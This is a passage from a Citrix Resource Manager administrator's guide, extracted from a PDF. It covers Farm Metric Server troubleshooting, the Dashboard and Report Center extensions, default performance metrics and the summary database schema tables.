If you see this message: • • First, find out which servers are acting as the primary Farm Metric Server and the backup Farm Metric Server. (See below.) Ensure that both the primary Farm Metric Server and the backup are operational. If either server is down, restart it.
If either server is heavily loaded, the Farm Metric Server can take some time to respond, so this error message probably indicates a time-out error. If you suspect that this might be the case, wait for a few moments, or change the Farm Metric Server and the backup to servers that are more lightly loaded.
Locating Servers
Q: How do I find out which server is currently acting as the Database Connection Server?
To identify the Database Connection Server 1. On any Resource Manager server, start the Presentation Server Console. 2. In the left pane of the Console, click Resource Manager. 3. In the right pane, click the Summary Database tab. The current Database Connection Server is shown. See the Resource Manager online Help for instructions about how to change the Database Connection Server.
Q: How do I find out which server is currently acting as the Farm Metric Server?
To identify the Farm Metric Server 1. On any Resource Manager server, start the Presentation Server Console. 2. In the left pane of the Console, click Resource Manager. 3. In the right pane, click the Farm Metric Server tab. The current Farm Metric Servers are listed.
Go to Document Center
CHAPTER 8
Using the Monitoring and Reporting Extensions
In addition to the reporting and monitoring capabilities provided by Resource Manager in the Presentation Server Console, you can also create reports and analyze your farms’ performance using two extensions to the Access Suite Console: Report Center and Dashboard. For an overview of the features provided by the extensions, see “Extended Reporting Capabilities” on page 12 and “Extended RealTime Monitoring Capabilities” on page 13. Information about installation and software requirements for the Access Suite Console is in the MetaFrame Presentation Server Administrator’s Guide. User assistance for the extensions is provided on-screen in the Access Suite Console. This chapter provides extra information that you will find helpful when using the extensions. Note that the reports available in Report Center are different from those available in Resource Manager. Similarly, Dashboard allows you to display performance metrics differently from Resource Manager. So, to familiarize yourself with all the monitoring and reporting capabilities at your disposal, explore both the Presentation Server Console (containing Resource Manager) and the Access Suite Console (containing Dashboard and Report Center).
Monitoring Server Metrics
Using Dashboard, you can get an indication of the real-time performance of your server farm by: • Displaying selected performance data for a set of servers on a bar graph. This allows you to monitor, in a highly visual way, a single set of data across a range of servers. Displaying the current status of metrics for a particular server.
•
78
Resource Manager Administrator’s Guide
Go to Document Center
To display performance data for a set of servers 1. In the tree of the Access Suite Console, select the servers whose performance data you want to display. 2. Click Display performance data &gt; Dashboard, then select a metric. 3. If prompted, select the display size of the icons to use. A qualitative indication of the metric’s value is displayed on a small bar graph above each server icon. 4. Hold the pointer over each item to display the value of the metric. To analyze the current status of metrics for a particular server 1. Select a server. 2. Click Change Display &gt; View Server Health.
Creating Reports
Using Report Center, you can generate reports that describe the use and availability of your servers and published applications. You can also report on the sessions, client types, and policies that are in use in your farms. Note Report Center reports do not include information about Resource Manager applications. To create a report you specify the following: • The type of report. The pre-defined report types provided should cover most of your reporting needs, but you can download the other report types from the Citrix Web site. The items to include in the report, such as servers and applications. Where and in what format you want to save the report. Whether you want to email the report to other people. How often you want to run the report.
• • • •
You can monitor the status of reports that are due to run or have already run.
Go to Document Center
Chapter 8 Using the Monitoring and Reporting Extensions
79
Unexpected Behavior
Q: Although I scheduled a report to run, no report is generated and the job’s status is now “Error.” Why?
In order to run reports that require a connection to a summary database when you are not logged on to the machine running the Report Center, your credentials must be passed to the Task Scheduler. To ensure that this occurs, edit your report’s specification and ensure that Allow saving password is checked on the Connections tab of the Data Link Properties dialog box.
Q: I suspect that a report does not contain up-to-date information. How do I rectify this?
Make sure you run discovery just before generating a report. This is important if items such as servers or applications have been added to your farm. If you don’t run discovery before generating a report, data for new items is not included. If you suspect that data is missing from your report, this could be because an item in your farm has been removed since you generated the specification on which the report is based. For example, if a server has been removed from a farm, the selection in the report includes the server, but no data is displayed for the server.
Q: I cannot save a schedule with a particular name because Report Center tells me that a schedule already exists with that name, even though it doesn’t appear in my list of schedules. Why?
Report Center creates schedules using Microsoft Task Scheduler, which you may have used to create schedules for other reasons. Either rename the Report Center schedule or locate the other schedule with the same name, and, if it’s no longer needed, delete it. Then try saving the Report Center schedule again.
Go to Document Center
APPENDIX A
Default Metric Set
Overview
This appendix describes the default set of metrics that is monitored by Resource Manager for Microsoft Windows 2000 and Windows Server 2003 operating systems. The explanations of each metric are based on the default configuration. Alternative configurations may produce alerts under different circumstances from those described here.
82
Resource Manager Administrator’s Guide
Go to Document Center
Default Set of Metrics
Data Store Connection Failure
Minutes
The number of minutes since the server last successfully connected to the data store, informing you if communications between a server and the IMA data store fail. This failure could be because: • • • The IMA data store DBMS system is down. This could be due to failure, or for maintenance. The network connection to the server with the IMA data store is down. The server with the IMA data store is down.
License Server Connection Failure
Minutes
The number of minutes since the server last successfully connected to the license server, informing you if communications between a server and the license server fail. This failure could be because: • • • A hardware failure on the license server has occurred The license service on the license server is malfunctioning Network problems exist between the license server and the MetaFrame Presentation Server computer
Logical Disk
Important Resource Manager Logical Disk metrics require that Windows Logical Disk counters are enabled. You can determine whether or not they are enabled by running the “diskperf” utility at the command line. For more information on the Logical Disk performance counters, run the “diskperf /?” command.
% Disk Time
Gives an indication of how busy the disks are. The disk can become a bottleneck for a number of reasons: • The server has too little physical memory so is “thrashing.” If thrashing is occurring, the pages/sec will also be high.
Go to Document Center
Appendix A Default Metric Set
83
•
A single user is running an application or process that makes extensive and rapid use of the disk. You can investigate such a user by running Current Process and Current User reports. Many users are performing large amounts of disk activity. The speed of the disks may be the server’s bottleneck.
•
The metric % Disk Time is calculated using a number of factors, and values above 100% are possible. If you see values of 100% disk time, the disk is in constant use. Values greater than 100% may indicate that the disk is too slow for the number of requests.
% Free Space
The server is running out of disk space. Several factors can cause this: • • • A lack of remaining disk space after installing the operating system and applications A large number of users have logged on (now or in the past) and their configuration data, settings, and files are taking up too much space A rogue process or user is consuming a large amount of disk space
Memory
Available Bytes
Informs you if too much memory is being used. This could be because: • • • Too many users are logged on. The applications that users are running are too memory hungry for the amount of memory available on the server. Some user or process is using a large amount of memory. Running a Current Process report may help you track this down.
Being short on memory could result in “thrashing.” The disk usage and paging metrics may also change to a red alarm state.
Pages/sec
A large amount of paging indicates either: • The system is low on physical memory and the disk is being used extensively as virtual memory. This can be caused by too many users being logged on, too many processes running, or a rogue process “stealing” virtual memory.
—Or—
84
Resource Manager Administrator’s Guide
Go to Document Center
•
An active process or processes are making large and frequent memory accesses.
Too much paging degrades the performance of the server for all users logged on. The Available Bytes, Disk, and % Processor Time metrics may also enter warning or danger states when a large amount of paging occurs. Short bursts of heavy paging are normal, but long periods of heavy paging seriously affect server performance.
Network Interface
Bytes Total/sec
Gives a good indication of how much network activity this server is generating or receiving. If this metric changes to yellow or red, the server is experiencing unusually high network activity and may cause a network saturation. If too many users are remotely logged on for the network card to support, this metric may change to a warning or danger state. In this situation, the bottleneck could be the network or server’s network card, which may decrease performance of users’ sessions.
Paging File
% Usage
A high page file usage usually indicates that the server’s page file size should be extended. If the Memory: Pages/sec metric is also high, it is a good idea to add more physical memory.
Processor
% Interrupt Time
The processor is spending a large amount of time responding to input and output rather than user processing. A large value for interrupt time usually indicates a hardware problem or a very busy server.
% Processor Time
A high processor time for a long period of time indicates that the processor is the bottleneck of the server, too many users are logged on, or there is a rogue user or process (use the Current Process report to investigate).
Go to Document Center
Appendix A Default Metric Set
85
System
Context Switches/sec
A large number of threads and/or processes are competing for processor time.
Terminal Services
Active Sessions
A large number of users are logged on and running applications. The server may begin running out of memory or processor time and performance for users may deteriorate. Note that current Presentation Server Console sessions are listed as “active.”
Inactive Sessions
There is a large number of disconnected sessions, which are taking up virtual memory. Remove some disconnected sessions or reduce the length of time for which disconnected sessions can persist until they are automatically removed.
Go to Document Center
APPENDIX B
Summary Database Schema
Overview
This appendix describes the layout and organization of the Resource Manager summary database schema. The summary database is a data warehouse made up of historical data imported from each Resource Manager server in the server farm. The database schema of the local database is de-normalized, whereas the data stored in the summary database is extensively normalized to save storage space. It includes: • • A diagram of database entity relationships Descriptions of each database entity table
Database Entity Relationship Diagram
The diagram on the following page shows all the tables in the schema and the links required to retrieve data. The main tables are named SDB<em>xxx and have a white background to their title bar. Supporting (or look-up) tables have a gray background to their title bar and are (mostly) named LU_xxx. Some supporting tables are used more than once. This reduces the space required to store the data.
<img src="" alt=""> 88
Resource Manager Administrator’s Guide
Go to Document Center
A Diagram Showing Database Entity Relationships
Go to Document Center
Appendix B Summary Database Schema
89
Database Entity Table Descriptions
The following data types are all described using Microsoft SQL Server data types. For type mappings to other SQL databases, see the type mapping section at the end of this Appendix.
Application History
SDB_APPHISTORY
This table stores a history of published applications supported on each server.
SDB_HISTORY PK_SDB_APPHISTID FK_APPNAMEID FK_SERVERID STARTTIME ENDTIME SERVERUTCBIAS int int int date time date time int NOT NULL NOT NULL NOT NULL NOT NULL NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_APPNAME, application name Pointer to LU_SERVER, server name Time application was supported by this server Time application no longer supported by server Bias in minutes to be subtracted from EVENTTIME to find the event time in the server&#39;s local time zone
Foreign Key(s) • • • • • • • FK_APPNAMEID FK</em> SERVERID FK<em> SERVERID FK</em> APPNAMEID STARTTIME LU<em>APPNAME LU_SERVER
Unique
Support Tables Referenced
90
Resource Manager Administrator’s Guide
Go to Document Center
Application Metrics
SDB_APPMETRICS
This table stores a summary of all application metrics in a server farm.
SDB_APPMETRICS FK_APPNAMEID FK_FARMNAMEID FK_OBJECTID APPMETRICUPDATETIME APPMETRICSAMPLEPERIOD APPMETRICDATACOUNT MINAPPMETRICVALUE MAXAPPMETRICVALUE MEANAPPMETRICVALUE STDDEVAPPMETRICVALUE int int int date time int int float float float float NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Pointer to LU_APPNAME, application name and type Pointer to LU_FARMNAME, farm name Pointer to LU_OBJECT, object name Timestamp of last application metric data point in dataset (stored in UTC) Sample period of summary record in seconds Number of data points used to summarize this row Minimum application metric value Maximum application metric value Mean application metric value Standard deviation of application metric values
Foreign Key(s) • • • FK_APPNAMEID FK_FARMNAMEID FK_OBJECTID
Go to Document Center
Appendix B Summary Database Schema
91
Unique • • • • • • • • FK_APPNAMEID FK_FARMNAMEID FK_OBJECTID APPMETRICUPDATETIME APPMETRICUPDATETIME LU_APPNAME LU_FARMNAME LU_OBJECT
Additional Indexed Columns Support Tables Referenced
Client History
SDB_CLIENTHISTORY
SDB_CLIENTHISTORY FK_SDB_SESSIONID FK_CLIENT_ID FK_CLIENTPROPERTIESID STARTTIME ENDTIME SERVERUTCBIAS int int int date time date time int NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Pointer into SDB_SESSION for sessionID Pointer into LU_CLIENT for client name and address Pointer into LU_CLIENT_PROPERTIES for build number, version, client type Time client connected to session Time client disconnected (or time IMA service was stopped) Bias in minutes to be subtracted from time fields to adjust the time to the server&#39;s local time zone Boolean indicating whether Secure Gateway was used Pointer into LU_LAUNCHER table
USINGSG FK_LAUNCHERID
INT INT
92
Resource Manager Administrator’s Guide
Go to Document Center
Foreign Key(s) • • • • • • • • FK_SDB_SESSIONID FK_CLIENTID FK_CLIENTPROPERTIESID FK_LAUNCHERID SDB_SESSION LU_CLIENT LU_CLIENTPROPERTIES LU_LAUNCHER
Support Tables Referenced
Connection History
SDB_CONNECTIONHISTORY
This table stores connected and disconnected session counts at the time of any session connect or disconnect event for each server in the farm.
SDB_CONNECTIONHISTORY FK_SERVERID CONNECTED DISCONNECTED TIMESTAMP int int int date time NOT NULL NOT NULL NOT NULL NOT NULL Pointer to LU_SERVER, RM server name Count of connected sessions Count of disconnected sessions Bias in minutes to be subtracted from TIMESTAMP to adjust the time to the server&#39;s local time zone
Foreign Key(s) • • • FK</em> SERVERID FK<em> SERVERID TIMESTAMP Unique
Go to Document Center
Appendix B Summary Database Schema
93
Support Tables Referenced • LU</em> SERVER
Event Log
SDB_EVENTLOG
This table stores generic IMA service up and IMA service down events that occur on a server farm.
SDB_EVENTLOG EVENTCODE FK_SERVERID EVENTTIME SERVERUTCBIAS int int date time int NOT NULL NOT NULL NOT NULL NOT NULL Generic event ID. SERVER_DOWN = 0, SERVER_UP = 1 Pointer to LU_SERVER, Resource Manager server name Timestamp of event occurrence (Date and Time) Bias in minutes to be subtracted from EVENTTIME to find the event time in the server’s local time zone
Foreign Key(s) • • • • • • FK_SERVERID EVENTTIME LU_SERVER EVENTCODE FK_SERVERID EVENTTIME Additional Indexed Columns Support Tables Referenced Unique
94
Resource Manager Administrator’s Guide
Go to Document Center
Administrator Configurable Server Metrics
SDB_METRICS
This table stores all metrics imported from each Resource Manager server in the server farm. The metric values are summarized to reduce data storage requirements.
SDB_METRICS FK_SERVERID FK_METRICID METRICUPDATETIME SERVERUTCBIAS int int date time int NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NULL Pointer to LU_SERVER, Resource Manager server name Pointer to LU_METRIC, metric description Timestamp of last metric data point in dataset (stored in UTC) Bias in minutes to be subtracted from EVENTTIME to find the event time in the server&#39;s local time zone Sample period of summary record in seconds Number of data points used to summarize this row Minimum metric value Maximum metric value Mean metric value Standard deviation of metric values Reference to folders and zone information
METRICSAMPLEPERIOD METRICDATACOUNT MINMETRICVALUE MAXMETRICVALUE MEANMETRICVALUE STDDEVMETRICVALUE FK_SERVERINFID
int int float float float float Int
Primary Key (Unique) • • • FK_SERVERID, FK_METRICID, METRICUPDATETIME FK_METRICID FK_SERVERID Foreign Key(s)
Go to Document Center
Appendix B Summary Database Schema
95
Additional Indexed Columns • • • • METRICUPDATETIME LU_METRIC LU_SERVER LU_SERVERINF Support Tables Referenced
Processes
SDB_PROCESS
This table stores process data per user.
SDB_PROCESS PK_SDB_PROCESSID FK_SERVERID FK_PROCESSID FK_USERID FK_CLIENTID FK_APPNAMEID int int int int int int NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_SERVER, Resource Manager server name Pointer to LU_PROCESS Pointer to LU_USER, user name Pointer to LU_CLIENT, client name Pointer to LU_APPNAME, application name and type of the application with which the process is most closely associated. This is determined by examining each process in the process parenting hierarchy (starting with the process itself and working upwards) and comparing the process executable path with that of all published applications. If a match is found, FK_APPNAMEID reflects this; if no match is found, FK_APPNAMEID is set to reflect a blank application name. Pointer to SDB_SESSION, session data
FK_SDB_SESSIONID
int
NOT NULL
96
Resource Manager Administrator’s Guide
Go to Document Center
SDB_PROCESS PID EXITCODE int int NOT NULL NOT NULL NOT NULL NOT NULL NULL Process identifier (from operating system) The exit code returned by the executable when it completes. 259 means “Still executing” A mask indicating which processor(s) the process can use to execute itself Time the process started executing Time the process completed execution - or the time the process statistics were last updated when EXITCODE = 259 End time - Start time (in milliseconds) A summation of all monitored periods of a process where the CPU time was greater than 1% The percentage of kernel CPU time the process has used during its lifetime The percentage of user CPU time the process has used during its lifetime The percentage of user CPU that was being used during the ACTIVETIME The percentage of kernel CPU that was being used during the ACTIVETIME Sum of the average number of megabytes per minute used by the process during its lifetime The number of megabytes per minute used by the process during the ACTIVETIME The peak recorded working set of the processes at any point during its lifetime The peak page file allocated to process in bytes at any point in its lifetime The number of page faults that occurred The peak paged pool usage in bytes at any point in its lifetime
AFFINITY STARTTIME ENDTIME
int date time date time float float
TOTALTIME ACTIVETIME
NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL
KERNELUSE USERUSE USERACTIVE KERNELACTIVE MEMORY
float float float float float
MEMORYACTIVE WORKSET PAGEFILE PAGEFAULTS PAGEDPOOL
float int int int int
Go to Document Center
Appendix B Summary Database Schema
97
SDB_PROCESS NONPAGEDPOOL SESSID SERVERUTCBIAS int int int NOT NULL NOT NULL NOT NULL The peak non-paged pool usage in bytes at any point in its lifetime Matches the SESSIONID value in the SESSION table Bias, in minutes, to be subtracted from EVENTTIME to find the event time in the server&#39;s local time zone
Primary Key (Unique) • • • • • • • • • • • • • • • PK_SDB_PROCESSID FK_APPNAMEID FK_CLIENTID FK_PROCESSID FK_SERVERID FK_USERID FK_SDB_SESSIONID STARTTIME, ENDTIME FK_SERVERID, STARTTIME, PID LU_APPNAME LU_CLIENT LU_PROCESS LU_SERVER LU_USER SDB_SESSION Foreign Key(s)
Additional Indexed Columns Unique Support Tables Referenced
98
Resource Manager Administrator’s Guide
Go to Document Center
User Information
SDB_SESSION
This table stores session data per user.
SDB_SESSION PK_SDB_SESSIONID FK_USERID FK_SERVERID FK_CLIENTID FK_APPNAMEID int int int int int NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NULL NULL NOT NULL NULL NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Start time of the first process run under the user&#39;s session (stored in UTC) End time of the final process to end as part of the session (stored in UTC) End time - Start time in milliseconds Bias in minutes to be subtracted from EVENTTIME to find the event time in the server&#39;s local time zone Bias in minutes to be subtracted from SESSIONSTART in which to find the session start-time A Session ID (generated by operating system) Sum of the total time for all completed processes Sum of the active time for all completed processes Unique identifier for referential integrity (Primary Key) Pointer to LU_USER, user name Pointer to LU_SERVER, Resource Manager server name Pointer to LU_CLIENT, client name Pointer to LU_APPNAME, application name and type for the published application with which the session was launched Pointer to LU_WINSTATION, name of the WinStation the session is connected through
FK_WINSTATIONID PROTOCOL SESSIONSTART SESSIONEND DURATION SERVERUTCBIAS
int int date time date time float int
SESSIONUTCBIAS
int
SESSIONID TOTALTIMESUM ACTIVETIMESUM
int float float
Go to Document Center
Appendix B Summary Database Schema
99
SDB_SESSION CPUTIMESUM MEMORYSUM BILLSTATUS float float int NOT NULL NOT NULL NOT NULL Sum of the CPU time for all completed processes Sum of the memory usage for all completed processes 0 = This session is not billed
Primary Key (Unique) • • • • • • • • • • • • • PK_SDB_SESSIONID FK_APPNAMEID FK_CLIENTID FK_SERVERID FK_USERID FK_WINSTATIONID STARTTIME, ENDTIME FK_SERVERID, SESSIONSTART, SESSIONID LU_APPNAME LU_CLIENT LU_SERVER LU_USER LU_WINSTATION Foreign Key(s)
Additional Indexed Columns Unique Support Tables Referenced
100
Resource Manager Administrator’s Guide
Go to Document Center
Version Control
SCHEMAVERSION
This table stores the version of the summary database schema. The version number is queried on connection by the Database Connection Server to determine if it and the summary database schema are compatible.
SCHEMAVERSION VERSION int NOT NULL Version number of database schema
Support and Look-Up Tables
LU_APPNAME
Look-up table of published application names.
LU_APPNAME PK_APPNAMEID APPNAME APPTYPE int nvarchar (256) int NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Application name Application type: 0 = MetaFrame Presentation Server published application, 1 = Resource Manager application
Primary Key (Unique) • • PK_APPNAMEID APPNAME, APPTYPE Unique
Go to Document Center
Appendix B Summary Database Schema
101
LU_CLIENT
Look-up table of client names.
LU_CLIENT PK_CLIENTID CLIENTNAME CLIENTADDRESSFAMILY CLIENTADDRESS int nvarchar(32) int nvarchar(20) NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Client name Client address family: 2 = AF_INET, 6 = AF_IPX Client address
Primary Key (Unique) • • PK_CLIENTID CLIENTNAME, CLIENTADDRESSFAMILY, CLIENTADDRESS Unique
LU_CLIENTPROPERTIES
Look-up table of client build, version (if available), and a reference into the LU_CLIENTTYPEMAPPINGS table.
LU_CLIENTPROPERTIES PK_CLIENTPROPERTIES FK_CLIENTTYPEID BUILD VERSION int int int nvarchar(64) NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Reference into LU_CLIENTTYPEMAPPINGS Client build number Client version, or “ “ if not available
Primary Key (Unique) • PK_CLIENTPROPERTIESID
102
Resource Manager Administrator’s Guide
Go to Document Center
Unique • • • FK_CLIENTTYPEID BUILD VERSION
LU_CLIENTTYPEMAPPINGS
Maps protocol type and client product identifier onto a client type name. Known mappings are populated when the schema is created. New ones will be added as ICA n or RDP n where n is the client product identifier.
LU_CLIENTTYPEMAPPINGS PK_CLIENTTYPEID PROTOCOL_TYPE CLIENT_TYPE int int int NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Protocol type. 0 = Console, 1 = ICA, 2 =RDP Client product identifier
CLIENTTYPENAME
nvarchar(32)
Semi-useful string (for example, ICA Win32)
Primary Key (Unique) • • • PK_CLIENTTYPEID CLIENT_TYPE PROTOCOL_TYPE Unique
LU_FARMNAME
Look-up table for server farm names. It is a support table for LU_SERVER.
LU_FARMNAME PK_FARMNAMEID FARMNAME int nvarchar (255) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Server farm name
Go to Document Center
Appendix B Summary Database Schema
103
Primary Key (Unique) • • PK_FARMNAMEID FARMNAME Unique
LU_INSTANCE
Look-up table of instances; for example, “C:.”
LU_INSTANCE PK_INSTANCEID INSTANCE int nvarchar (128) NOT NULL NULL Unique identifier for referential integrity (Primary Key) Instance name
Primary Key (Unique) • • PK_INSTANCEID INSTANCE Unique
LU_LAUNCHER
Look-up table of launchers, for example, Program Neighborhood Agent.
LU_LAUNCHER PK_LAUNCHERID LAUNCHER int nvarchar(128) NOT NULL NULL Unique identifier for referential integrity (Primary Key) Launcher name
Primary Key (Unique) • • PK_LAUNCHERID LAUNCHER Unique
104
Resource Manager Administrator’s Guide
Go to Document Center
LU_METRIC
Look-up table of metric definitions. This table stores look-up keys for objects, metric counters, and instances.
LU_METRIC PK_METRICID FK_OBJECTID FK_METRICCOUNTERID FK_INSTANCEID int int int int NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_OBJECT, object name Pointer to LU_METRICCOUNTER, metric counter name Pointer to LU_INSTANCE, instance name
Primary Key (Unique) • • • • • • • • PK_METRICID FK_INSTANCEID FK_METRICCOUNTERID FK_OBJECTID PK_OBJECTID, FK_METRICCOUNTERID, FK_INSTANCEID LU_INSTANCE LU_METRICCOUNTER LU_OBJECT Foreign Key(s)
Unique Support Table Referenced
Go to Document Center
Appendix B Summary Database Schema
105
LU_METRICCOUNTER
Look-up table of metric counters; for example, “% Disk time.”
LU_METRICCOUNTER PK_METRICCOUNTERID METRICCOUNTER int nvarchar (128) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Metric counter name
Primary Key (Unique) • • PK_METRICCOUNTERID METRICCOUNTER Unique
LU_NETDOMAIN
Look-up table for Network Domain names. It is a support table for LU_SERVER and LU_USER.
LU_NETDOMAIN PK_NETDOMAINID NETDOMAIN int nvar char (32) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Network domain name
Primary Key (Unique) • • PK_NETDOMAINID NETDOMAIN Unique
106
Resource Manager Administrator’s Guide
Go to Document Center
LU_OBJECT
Look-up table of objects; for example, “Logical Disk.”
LU_OBJECT PK_OBJECTID OBJECT int nvar char (128) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Object name
Primary Key (Unique) • • PK_OBJECTID OBJECT Unique
LU_PATH
Look-up table of application paths. This is a support table for LU_PROCESS.
LU_PATH PK_PATHID PATH int nvar char (260) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Path
Primary Key (Unique) • • PK_PATHID PATH Unique
Go to Document Center
Appendix B Summary Database Schema
107
LU_PROCESS
Look-up table of process details.
LU_PROCESS PK_PROCESSID FK_PATHID FK_PROCESSNAMEID TYPE int int int int NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_PATH, path name Pointer to LU_PROCESSNAME, executable name of the file associated with the process Type of the executable. Win32, POSIX etc. -1 indexed, where -1 = system process, 0 means Win32 application Hexadecimal version number of executable
VERSION
nvar char (24) date time
PRODUCTDATE
Timestamp of executable (by originators)
Primary Key (Unique) • • • • • • PK_PROCESSID FK_PATHID FK_PROCESSNAMEID FK_PATHID, FK_PROCESSNAMEID, TYPE, VERSION, PRODUCTDATE LU_PATH LU_PROCESSNAME Foreign Key(s)
Unique Support Tables Referenced
108
Resource Manager Administrator’s Guide
Go to Document Center
LU_PROCESSNAME
Look-up table of process names. This is a support table for LU_PROCESS.
LU_PROCESSNAME PK_PROCESSNAMEID PROCESSNAME int nvar char (255) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Executable name of the file associated with the process
Primary Key (Unique) • • PK_PROCESSNAMEID PROCESSNAME Unique
LU_SERVER
Look-up table for Resource Manager server instances.
LU_SERVER PK_SERVERID FK_SERVERNAMEID FK_NETDOMAINID FK_FARMNAMEID UPDATETIME int int int int date time NOT NULL NOT NULL NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_SERVERNAME, Resource Manager server name Pointer to LU_NETDOMAIN, network domain name Pointer to LU_FARMNAME, server farm name The last time summary data was written to the summary database for this particular server
Primary Key (Unique) • PK_SERVERID
Go to Document Center
Appendix B Summary Database Schema
109
Foreign Key(s) • • • • • • • FK_FARMNAMEID FK_NETDOMAINID FK_SERVERNAMEID FK_SERVERNAMEID, FK_NETDOMAINID, FK_FARMNAMEID LU_FARMNAME LU_NETDOMAIN LU_SERVERNAME
Unique Support Tables Referenced
LU_SERVERNAME
Look-up table for Resource Manager server names. It is a support table for LU_SERVER.
LU_SERVERNAME PK_SERVERNAMEID SERVERNAME int nvar char (32) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Server name
Primary Key (Unique) • • PK_SERVERNAMEID SERVERNAME Unique
110
Resource Manager Administrator’s Guide
Go to Document Center
LU_SERVERINF
Look-up table for Resource Manager server folder and zone information.
LU_SERVERNAME PK_SERVERINFID FOLDER int nvar char (255) nvar char (128) NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Folder name
ZONE
Zone name
Primary Key (Unique) • • PK_SERVERINFID FK_SERVERINFID, FOLDER, ZONE Unique
LU_USER
Look-up table of user instances.
LU_USER PK_USERID FK_NETDOMAINID USERNAME int int nvar char (32) NOT NULL NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Pointer to LU_NETDOMAIN, network domain name User name
Primary Key (Unique) • • PK_USERID FK_NETDOMAINID Foreign Key(s)
Go to Document Center
Appendix B Summary Database Schema
111
Unique • • FK_NETDOMAINID, USERNAME LU_NETDOMAIN Support Tables Referenced
LU_WINSTATION
Look-up table for WinStation names.
LU_WINSTATION PK_WINSTATIONID WINSTATION int nvar char (32) NOT NULL NOT NULL Unique identifier for referential integrity (Primary Key) Name of the WinStation through which the session is connected
Primary Key (Unique) • • PK_WINSTATIONID WINSTATION Unique
SDB_SCRATCH
A cross-reference table used to identify session records contained in Billing reports so that the sessions can be updated to show they were billed.
SDB_SCRATCH CMC_ID REPORT_ID USER_ID SCRATCH_DATE FK_SDB_SESSIONID SESSION_START SESSION_DURATION date time int date time float int int NULL NULL NULL NOT NULL NOT NULL NULL NULL Identifies the Presentation Server Console that generated the report Identifies the report in question Identifies a user within the report Time that this table row was created SDB_SESSION.PK_SDB_SESSIONID session table primary key value SDB_SESSION.SESSIONSTART value SDB_SESSION.DURATION value
112
Resource Manager Administrator’s Guide
Go to Document Center
SDB_SCRATCH PROCESS_TOTAL_TIME SERVER_UTC_BIAS SERVER_NAME float int nvar char (32) NULL NULL NULL SDB_SESSION.TOTALTIMESUM value SDB_SESSION.SERVERUTCBIAS value The server that the session ran on
Primary Key (Unique) • • • • • • None None None SESSION_START FK_SDB_SESSIONID CMC_ID, REPORT_ID, USER_ID, FK_SDB_SESSIONID Foreign Key(s) Unique Additional Indexed Columns
SDB_HEURISTICS
This table holds miscellaneous data used by Resource Manager.
SDB_HEURISTICS PK_HEURISTIC nvar char (64) float NOT NULL NOT NULL Name of heuristic
HEURVALUE
Value of heuristic
Go to Document Center
Appendix B Summary Database Schema
113
String Length Table
This table lists the maximum string lengths available.
String LU_SERVERNAME\SERVERNAME LU_NETDOMAIN\NET\NETDOMAIN LU_FARMNAME\FARMNAME LU_OBJECT\OBJECT LU_METRICCOUNTER\METRICCOUNTER LU_INSTANCE\INSTANCE LU_APPNAME\APPNAME Length 32 32 256 128 128 128 39 Justification/Reference CNLEN=15 in LMCONS.H (NT Header), padded to RM1 size DNLEN=15 in LMCONS.H (NT Header), padded to RM1 size MAXLEN_FARMNAME=255 in Cconfig.H (MF header) Taken from Monitor Subsystem Taken from Monitor Subsystem Taken from Monitor Subsystem PNDATA_BROWSERNAME_LEN GTH in imacommonapplicationdefs.h (MF) UNLEN=15 in LMCONS.H (NT Header), padded to RM1 size CNLEN=15 in LMCONS.H (NT Header), padded to RM1 size ADDRESS size = 20 in Wtsapi32.h (NT Header) WINSTATIONNAME_LENGTH=32 in CTXDEF.H (MF header) MAX_PATH in WINDEF.H (NT header) MAX_PATH in WINDEF.H (NT header) imacore.h Imacommonapplicationdefs.h. Dropped one character due to technical issue with DBMS Client VERSION Client type name, for example ICA Win32, ICA Mac, RDP Win32 Client launcher, for example Program Neighborhood Agent
LU_USER\USERNAME LU_CLIENT\CLIENTNAME LU_CLIENT\CLIENTADDRESS LU_WINSTATION\WINSTATION LU_PATH\PATH LU_PROCESSNAME\PROCESSNAME LU_SERVERINF\ZONE LU_SERVERINF\FOLDERS
32 32 20 32 260 255 128 255
LU_CLIENTPROPERTIESVERSION LU_CLIENTTYPEMAPPINGS\CLIENTTYPE NAME LU_LAUNCHER
64 32 256
114
Resource Manager Administrator’s Guide
Go to Document Center
SQL Data Type Mapping
Column data types vary between different SQL databases. A list of all data types used in the summary database for all supported SQL databases follows:
Description Integer numbers Small integer numbers Floating point numbers Date and time National variable length strings (Unicode) Microsoft SQL Server int tinyint float datetime nvarchar Oracle int smallint float date varchar2
Go to Document Center
APPENDIX C
Glossary
CSV
